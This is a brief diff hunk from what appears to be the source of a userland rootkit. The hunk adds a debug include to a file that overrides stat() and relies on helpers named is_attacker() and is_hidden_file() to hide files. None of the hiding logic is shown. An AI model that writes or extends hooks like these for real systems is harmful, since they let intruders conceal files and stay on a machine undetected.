@@ -22,6 +22,7 @@
 #include <errno.h> /* errno, ENOENT */
 #include "beurk.h" /* is_attacker(), is_hidden_file() */
 #include "config.h" /* REAL_STAT() */
+#include "debug.h" /* DEBUG() */
 #include "hooks.h" /* prototype */
 
 int stat(const char *pathname, struct stat *buf) {
